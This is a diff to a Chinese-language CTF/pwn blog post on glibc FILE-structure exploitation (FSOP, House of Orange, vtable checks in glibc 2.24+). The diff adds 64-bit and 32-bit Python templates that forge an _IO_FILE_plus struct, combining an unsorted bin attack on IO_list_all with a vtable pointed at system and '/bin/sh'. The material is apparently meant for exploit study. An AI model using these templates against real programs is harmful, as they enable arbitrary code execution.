@@ -186,6 +186,32 @@ $7 = {
 
 见我的另一篇文章[https://sirhc.xyz/2018/11/06/House-of-orange/#fsop](https://sirhc.xyz/2018/11/06/House-of-orange/#fsop%E5%8E%9F%E7%90%86)
 
+64位的_IO_FILE_plus构造模板：
+
+```python
+stream = "/bin/sh\x00"+p64(0x61)
+stream += p64(0xDEADBEEF)+p64(IO_list_all-0x10)
+stream +=p64(1)+p64(2) # fp->_IO_write_ptr > fp->_IO_write_base
+stream = stream.ljust(0xc0,"\x00")
+stream += p64(0) # mode<=0
+stream += p64(0)
+stream += p64(0)
+stream += p64(vtable_addr)
+```
+
+32位的_IO_FILE_plus构造模板：
+
+```python
+stream = "sh\x00\x00"+p32(0x31)   # system_call_parameter and link to small_bin[4] 
+stream += ";$0\x00"+p32(IO_list_all-0x8)   # Unsorted_bin attack
+stream +=p32(1)+p32(2)     # fp->_IO_write_ptr > fp->_IO_write_base
+stream = stream.ljust(0x88,"\x00")  
+stream += p32(0)    # mode<=0
+stream += p32(0)
+stream += p32(0)
+stream += p32(vtable_addr)  # vtable_addr --> system
+```
+
 ## libc_2.24及以上的利用
 
 glibc 2.24 对 `vtable` 做了检测，导致我们不能通过伪造 `vtable` 来执行代码，对 `vtable` 进行校验的函数是 `IO_validate_vtable`
@@ -254,7 +280,7 @@ const struct _IO_jump_t _IO_str_jumps libio_vtable =
 
 * 利用`__IO_str_jumps`中的`_IO_str_finsh`函数
 * 利用`__IO_str_jumps`中的`_IO_str_overflow`函数
-* 任意地址写，修改`_IO_2_1_stdin_` 中的 `_IO_buf_end`
+
 
 #### 如何定位_IO_str_jumps？
 
